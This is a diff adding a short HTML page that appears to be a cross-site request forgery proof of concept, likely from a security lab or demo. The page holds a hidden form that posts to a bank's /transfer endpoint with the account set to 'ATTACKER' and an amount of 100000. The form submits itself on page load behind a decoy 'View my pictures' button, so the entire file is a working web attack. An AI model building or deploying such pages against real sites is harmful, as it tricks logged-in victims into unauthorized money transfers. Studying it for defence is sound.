@@ -1,0 +1,15 @@
+<html>
+
+<head>
+
+</head>
+<form action="http://bank.com:3000/transfer" method="POST">
+
+    <input type="hidden" name="account" value="ATTACKER"/>
+    <input type="hidden" name="amount" value="100000"/>
+    <input type="submit" value="View my pictures"/>
+
+</form>
+<body onload="document.forms[0].submit()">
+</body>
+</html>
